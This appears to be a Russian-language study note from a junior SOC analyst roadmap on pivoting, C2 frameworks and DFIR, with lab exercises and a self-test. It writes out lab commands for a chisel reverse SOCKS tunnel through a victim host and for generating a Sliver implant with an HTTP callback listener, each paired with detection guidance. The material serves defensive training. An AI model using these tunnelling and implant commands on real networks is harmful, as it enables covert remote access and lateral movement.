---
tags: [soc, c2, pivoting, dfir, roadmap]
section: 07
---

# 07 - Глубокие топики (C2, Pivoting, DFIR)

[[00 - SOC Junior Roadmap (BiZone)]]

> **Лаба.** Для C2/pivoting: Kali (атакующий) + ВМ-жертвы в host-only сети. C2-фреймворк — **Sliver** (open-source, проще Cobalt Strike, легально). Для DFIR: бери дампы памяти с публичных датасетов и анализируй в **Volatility 3**; готовые кейсы — на CyberDefenders и Blue Team Labs Online.
>
> Это «будет плюсом» по вакансии — изучай после ядра (Linux/Windows/AD/сети/SIEM). **Формат:** 📖 читать · 🛠 трогать · 💬 промпт мне.

---

## Pivoting (латеральное движение)

- [ ] Что такое pivoting — скомпрометированный хост как трамплин в сегмент
- [ ] Методы: SSH-туннели, SOCKS-прокси, port forwarding
- [ ] Инструменты: chisel, ligolo-ng, proxychains, Metasploit autoroute, SSH -D/-L/-R
- [ ] Связь с [[03 - Сети и сетевые атаки]] (туннелирование) и DMZ
- [ ] Детект: нетипичные внутренние соединения, цепочки логонов между хостами

📖 **Читать:** Habr «Pivoting или проброс портов» https://habr.com/ru/articles/302168/ ; Xakep «Pivoting на Hack The Box» https://xakep.ru/2019/12/26/htb-pivoting/ ; Habr «PhantomCore: pivoting + детект» https://habr.com/ru/articles/1025674/

🛠 **Потрогать (chisel в лабе):**
```bash
# на «скомпрометированном» хосте (сервер chisel):
./chisel server -p 8000 --reverse
# на Kali (клиент, создаёт SOCKS через жертву):
./chisel client <victim>:8000 R:socks
# потом proxychains через 127.0.0.1:1080 — ходишь в сеть жертвы
# ДЕТЕКТ: на жертве ss -tnp покажет исходящее на Kali; в логах — цепочка
```
Задание: подними chisel reverse SOCKS между двумя ВМ, проверь доступ к третьему хосту «через» жертву. На стороне жертвы зафиксируй исходящее соединение через `ss`.

💬 **Промпт мне:** «Объясни pivoting на схеме: атакующий → jump host → внутренняя сеть. Как SSH -D, chisel и ligolo делают это, и какие 4 признака видит SOC (соединения, логоны, прокси-процессы, трафик)».

---

## C2-фреймворки (Command & Control)

- [ ] Концепция: beacon, listener, payload, callback, jitter
- [ ] Каналы: HTTP(S), DNS, SMB named pipes, ICMP
- [ ] Фреймворки: Cobalt Strike, Sliver, Mythic, Meterpreter, Havoc, Empire
- [ ] Malleable C2 (маскировка трафика под легитимный)
- [ ] Детект: beaconing (регулярные интервалы), нетипичный User-Agent, JA3/JA4, DNS-аномалии

📖 **Читать:** Red Canary «Cobalt Strike» (детект-аналитика) https://redcanary.com/threat-detection-report/threats/cobalt-strike/ ; Unit42 «Malleable C2» https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/ ; Elastic «Cobalt Strike Beacon» (правило детекта) https://www.elastic.co/guide/en/security/current/cobalt-strike-command-and-control-beacon.html

🛠 **Потрогать (Sliver в лабе):**
```bash
# на Kali установи Sliver, сгенерируй имплант:
sliver > generate --http <kali_ip> --save /tmp/implant
# запусти listener:
sliver > http
# на ВМ-жертве запусти имплант, получи сессию
# смотри beaconing в Wireshark на стороне сети — регулярные callback'и
```
Задание: подними Sliver, получи beacon с жертвы, в Wireshark найди регулярность callback'ов (это и есть сигнатура beaconing для детекта).

💬 **Промпт мне:** «Объясни, что такое beaconing и почему регулярность callback'ов (даже с jitter) — главный признак C2. Как детектят по интервалам, JA3/JA4, User-Agent. Чем Malleable C2 усложняет детект».

---

## Концепция DFIR (Digital Forensics & Incident Response)

- [ ] Этапы IR (NIST): Preparation → Detection & Analysis → Containment → Eradication → Recovery → Lessons Learned
- [ ] SANS PICERL
- [ ] Триаж артефактов: память, диск, сеть, логи
- [ ] Инструменты: Volatility (память), KAPE, Velociraptor
- [ ] Chain of custody, timeline analysis (plaso)

📖 **Читать:** SecurityLab «Принципы DFIR» https://www.securitylab.ru/analytics/541880.php ; Инфобезопасность «DFIR: методы (PICERL)» https://infobezopasnost.ru/blog/articles/dfir-metody-reagirovaniya-na-intsidenty/ ; Habr «DFIR на практике: Lockdown Lab» https://habr.com/ru/articles/986314/ ; «Обзор NIST 800-61» https://habr.com/ru/articles/904252/

🛠 **Потрогать (Volatility 3):**
```bash
pip install volatility3
# скачай учебный дамп памяти (CyberDefenders / публичные образцы), потом:
vol -f memory.dmp windows.pslist        # процессы
vol -f memory.dmp windows.pstree        # дерево (аномальные родители!)
vol -f memory.dmp windows.netscan       # сетевые соединения (C2!)
vol -f memory.dmp windows.malfind       # инъекции кода
```
Задание: пройди один memory-forensics кейс на CyberDefenders: найди вредоносный процесс, его сетевые соединения и способ persistence в дампе памяти.

💬 **Промпт мне:** «Проведи меня по этапам реагирования на инцидент (PICERL) на конкретном примере (ransomware в сети). Что делает SOC на каждом этапе, и где L1 заканчивается, а L2/IR начинается».

---

## Forensics-артефакты

- [ ] Windows: Prefetch, Amcache, ShimCache, SRUM, Jump Lists, LNK, $MFT, ShellBags
- [ ] Linux: bash_history, auth.log, journal, inode timestamps
- [ ] Антифорензика: timestomping, очистка логов, secure delete

📖 **Читать:** SANS DFIR cheat sheets https://www.sans.org/posters/?focus-area=digital-forensics

💬 **Промпт мне:** «Дай карту forensics-артефактов Windows: артефакт → что доказывает (запуск программы / открытие файла / навигацию) → где лежит. И как timestomping пытается их обмануть».

---

## Progress

- [ ] Раздел пройден полностью
- [ ] Поднят pivoting (chisel) и C2 (Sliver) в лабе
- [ ] Пройден 1 memory-forensics кейс на CyberDefenders

---

## 🔭 Связь со следующими шагами

- **→ Blueteam (твоя цель):** DFIR, анализ памяти, forensics-артефакты — это L2/L3 и IR-команда. Прямой путь роста из L1. Дальше: GCFA/GCIH-уровень, Velociraptor, KAPE, plaso-таймлайны.
- **→ Инфрапентест:** pivoting и C2 — постэксплуатация и red team. Дальше: HTB Pro Labs, OSEP-уровень, кастомные C2-профили.
- **→ Purple team:** связка «как атакующий строит C2» + «как SOC его детектит» — самая ценная компетенция на стыке.

---

## 🧪 Тест для повторения

> [!question]- 1. Что такое pivoting и как детектить?
> Использование скомпрометированного хоста как трамплина в недоступный сегмент (SSH-туннель, SOCKS, port forwarding, proxychains). Детект: нетипичные внутренние соединения, цепочки логонов хост→хост, прокси-инструменты, аномальный трафик вглубь сети.

> [!question]- 2. Что такое beaconing и как его ловят?
> Регулярные callback импланта к C2. Детект: периодичность интервалов (даже с jitter), повторяющиеся обращения к одному домену/IP, нетипичный User-Agent, JA3/JA4-фингерпринт TLS, малый объём при высокой регулярности.

> [!question]- 3. 3 C2-фреймворка и каналы связи.
> Cobalt Strike, Sliver, Mythic, Meterpreter, Havoc, Empire. Каналы: HTTP(S), DNS, SMB named pipes, ICMP. Malleable-профили маскируют трафик под легитимный.

> [!question]- 4. Этапы реагирования на инцидент (PICERL).
> Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned. NIST аналогично: Preparation → Detection & Analysis → Containment/Eradication/Recovery → Post-Incident.

> [!question]- 5. Forensics-артефакты Windows «что запускалось».
> Prefetch (запуск программ), Amcache/ShimCache (исполнявшиеся бинари), SRUM (сетевая/процессная активность), Jump Lists/LNK (открытые файлы), $MFT (файловая активность), ShellBags (навигация).

> [!question]- 6. Что такое timestomping и как заметить?
> Антифорензика — подмена временных меток файла. Заметить: расхождение $STANDARD_INFORMATION и $FILE_NAME времён в MFT, round-секунды метки, несоответствие соседним файлам.

> [!question]- 7. Что такое jitter в C2 и зачем атакующему?
> Случайное отклонение интервала callback'ов (например ±20%), чтобы beaconing не был строго периодичным и хуже детектился по регулярности. Защита всё равно ловит по статистике интервалов.

> [!question]- 8. Зачем DNS как канал C2 и чем плох для атакующего?
> DNS почти всегда разрешён наружу (обходит файрвол), незаметен. Минус: низкая пропускная способность, шумные аномалии (много запросов, длинные поддомены) → детектируется по DNS-логам.

> [!question]- 9. Что анализируют в дампе памяти и каким инструментом?
> Volatility/Volatility3: список и дерево процессов (аномальные родители), сетевые соединения (netscan — C2), инъекции кода (malfind), загруженные DLL, командные строки, хеши. Память ловит fileless-малварь, которой нет на диске.

> [!question]- 10. Что такое containment и примеры?
> Сдерживание — ограничение распространения инцидента до устранения. Примеры: изоляция хоста от сети, блок C2-IP/домена, отключение скомпрометированной учётки, сегментная изоляция. Делается до eradication.

> [!question]- 11. Чем JA3/JA4 помогает детектить C2?
> Это фингерпринт TLS-клиента (по параметрам handshake). Импланты часто имеют узнаваемый JA3/JA4, отличный от легитимных браузеров → можно детектить C2 даже в зашифрованном HTTPS-трафике без расшифровки.

> [!question]- 12. Где заканчивается L1 и начинается L2/IR в инциденте?
> L1: триаж алерта, первичный контекст, вердикт TP/FP, эскалация. L2/IR: глубокое расследование, containment/eradication, forensics (память/диск), timeline, координация восстановления. L1 не делает реверс и глубокую форензику.

---

## 📚 Все источники раздела (сводно)

**Pivoting**
- Habr — pivoting/проброс портов: https://habr.com/ru/articles/302168/
- Xakep — pivoting на HTB: https://xakep.ru/2019/12/26/htb-pivoting/
- Habr — PhantomCore (pivoting + детект): https://habr.com/ru/articles/1025674/

**C2**
- Red Canary — Cobalt Strike: https://redcanary.com/threat-detection-report/threats/cobalt-strike/
- Unit42 — Malleable C2: https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/
- Elastic — Cobalt Strike Beacon (правило): https://www.elastic.co/guide/en/security/current/cobalt-strike-command-and-control-beacon.html
- Sliver (open-source C2 для лабы): https://github.com/BishopFox/sliver

**DFIR**
- SecurityLab — принципы DFIR: https://www.securitylab.ru/analytics/541880.php
- Инфобезопасность — DFIR/PICERL: https://infobezopasnost.ru/blog/articles/dfir-metody-reagirovaniya-na-intsidenty/
- Habr — DFIR Lockdown Lab: https://habr.com/ru/articles/986314/
- Habr — NIST 800-61: https://habr.com/ru/articles/904252/
- SANS DFIR cheat sheets: https://www.sans.org/posters/?focus-area=digital-forensics
- Volatility 3: https://github.com/volatilityfoundation/volatility3

**Практика**
- CyberDefenders (blue team кейсы): https://cyberdefenders.org/
- Blue Team Labs Online: https://blueteamlabs.online/
